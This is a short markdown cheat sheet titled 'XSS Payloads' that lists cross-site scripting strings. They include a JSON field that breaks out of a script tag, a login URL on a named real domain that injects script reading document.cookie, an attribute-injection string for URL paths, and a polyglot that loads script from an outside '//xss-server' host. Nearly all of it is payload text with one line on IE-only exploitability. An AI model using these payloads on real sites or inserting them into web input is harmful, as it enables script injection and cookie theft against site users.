---
title: "XSS Payloads"
---

```
JSON:
{"email":"some@email.com</script><script>alert(document.domain)//"}

The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE.
https://inventory.upserve.com/login/?'"--><script>confirm(document.cookie)</script>

In URL PATH:
"accesskey='x' onclick='confirm`1`' //

Hi'&gt;"<script src="//xss-server"></script><x="{9*9}\r\n%0a%09%0d<svg\onload=confirm(1)>
```
